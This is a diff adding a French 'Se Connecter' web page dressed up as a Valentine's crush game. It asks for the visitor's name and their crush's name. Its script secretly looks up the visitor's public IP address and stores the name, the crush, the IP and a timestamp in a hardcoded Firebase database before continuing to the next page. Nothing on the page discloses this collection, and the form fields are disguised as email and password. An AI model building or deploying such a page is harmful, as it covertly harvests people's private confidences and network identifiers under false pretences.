@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Se Connecter</title>
+<style>
+  body {
+  background-image: url('https://img.freepik.com/vecteurs-libre/fond-degrade-saint-valentin_23-2149242406.jpg?semt=ais_incoming&w=740&q=80');
+  background-repeat: no-repeat;
+  background-size: 100% 130%;
+  align-items: center;
+  justify-content: center;
+}
+
+.rectangle {
+  background-image: url('https://static3.depositphotos.com/1003326/195/i/450/depositphotos_1955542-stock-photo-flamy-symbol.jpg');
+  width: 600px;
+  height: 500px;
+  position : relative;
+  top : 50px;
+  left: 300px;
+}
+
+.text {
+  position: absolute;
+  top: 510px;
+  left: 340px;
+  border-radius: 15px;
+}
+
+.text2 {
+  position: absolute;
+  top: 510px;
+  left: 700px;
+  border-radius: 15px;
+}
+
+.btn-submit {
+  position: absolute;
+  top: 530px;
+  left: 580px;
+}
+
+</style>
+</head>
+<body>
+
+<div class="rectangle"></div>
+
+<form id="login-form" action="page2.html" method="get">
+  <input type="text" class="text" id="email" name="email" placeholder="Votre Nom">
+  <input type="text" class="text2" id="password" name="password" placeholder="Votre crush">
+  <input type="submit" class="btn-submit" value="Envoyer">
+</form>
+
+<!-- Firebase App (the core Firebase SDK) -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+<script>
+  // Config Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyB43Vq6Ev95FF5lH-Dt59vlt2NSIRiyqIU",
+    authDomain: "crush-d7cf9.firebaseapp.com",
+    databaseURL: "https://crush-d7cf9-default-rtdb.firebaseio.com/",
+    projectId: "crush-d7cf9",
+    storageBucket: "crush-d7cf9.firebasestorage.app",
+    messagingSenderId: "386373131438",
+    appId: "1:386373131438:web:31189e225e4114e079e13f",
+    measurementId: "G-B7YCGJ2LMS"
+  };
+
+  // Initialiser Firebase
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  // Intercepter le submit du formulaire
+  const form = document.getElementById('login-form');
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault(); // Empêche le refresh de page
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      // Récupérer l'IP publique
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip || "IP non trouvée";
+
+      // Envoyer dans Firebase
+      const newUserRef = database.ref('users').push();
+      await newUserRef.set({
+        moi: email,
+        crush: password,
+        ip: ip,
+        date: Date.now()
+      });
+
+      // Continuer vers page2.html
+      form.submit();
+    } catch (error) {
+      console.error("Erreur lors de l'envoi :", error);
+    }
+  });
+</script>
+
+</body>
+</html>
